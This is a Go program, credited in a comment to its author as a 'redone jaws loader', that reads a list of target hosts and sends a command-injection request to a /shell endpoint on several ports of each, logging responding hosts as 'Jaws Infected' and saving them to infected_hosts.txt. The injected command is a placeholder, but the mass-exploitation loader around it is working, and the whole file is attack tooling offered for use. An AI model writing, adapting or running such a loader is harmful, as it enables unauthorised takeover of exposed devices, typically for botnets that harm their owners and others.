package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)
//made by frostedflakes666 its a redone jaws loader loads jaws ports 

var wg sync.WaitGroup
var infectedHosts []string
var mutex = &sync.Mutex{}

func sendPayload(host string, port string) {
	defer wg.Done()
	url := fmt.Sprintf("http://%s:%s/shell?cd /tmp; payloadheree", host, port)
	client := http.Client{
		Timeout: 10 * time.Second, 
	}
	resp, err := client.Get(url)
	if err != nil {
		fmt.Printf("Failed to infect %s:%s: %s\n", host, port, err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		fmt.Printf("Jaws Infected %s:%s\n", host, port)
		saveInfectedHost(host)
	}
}

func sendPayloadToPorts(host string, ports []string) {
	for _, port := range ports {
		wg.Add(1)
		go sendPayload(host, port)
	}
}

func saveInfectedHost(host string) {
	mutex.Lock()
	infectedHosts = append(infectedHosts, host)
	mutex.Unlock()
}

func saveToFile(filename string) {
	file, err := os.Create(filename)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	for _, host := range infectedHosts {
		_, err := file.WriteString(host + "\n")
		if err != nil {
			fmt.Println("Error writing to file:", err)
			return
		}
	}
	fmt.Println("Infected hosts saved to", filename)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("usage: ./jaws <input list>")
		return
	}

	fileName := os.Args[1]

	file, err := os.Open(fileName)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var hosts []string

	for scanner.Scan() {
		hosts = append(hosts, scanner.Text())
	}

	ports := []string{"60001", "80", "8080", "5000", "5001", "5002"}

	for _, host := range hosts {
		sendPayloadToPorts(host, ports)
	}

	wg.Wait()

	saveToFile("infected_hosts.txt")
}
